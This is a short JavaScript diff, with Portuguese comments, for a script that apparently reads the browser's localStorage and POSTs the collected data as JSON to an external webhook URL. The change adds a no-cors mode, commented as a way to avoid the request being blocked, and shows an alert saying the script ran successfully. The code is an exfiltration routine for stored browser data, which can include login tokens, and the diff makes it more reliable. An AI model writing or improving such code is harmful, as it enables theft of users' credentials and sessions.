@@ -12,13 +12,13 @@ for (let i = 0; i < localStorage.length; i++) {
 
 fetch(webhookUrl, {
   method: 'POST',
+  mode: 'no-cors', // Adiciona o modo no-cors para evitar o bloqueio
   headers: {
     'Content-Type': 'application/json'
   },
   body: JSON.stringify(dados)
 })
-.then(response => alert("O script foi executado com sucesso!"))
-.then(result => console.log("Dados enviados com sucesso:", result))
+.then(() => alert("O script foi executado com sucesso!"))
 .catch(error => console.error("Erro ao enviar os dados:", error));
 
 export {};
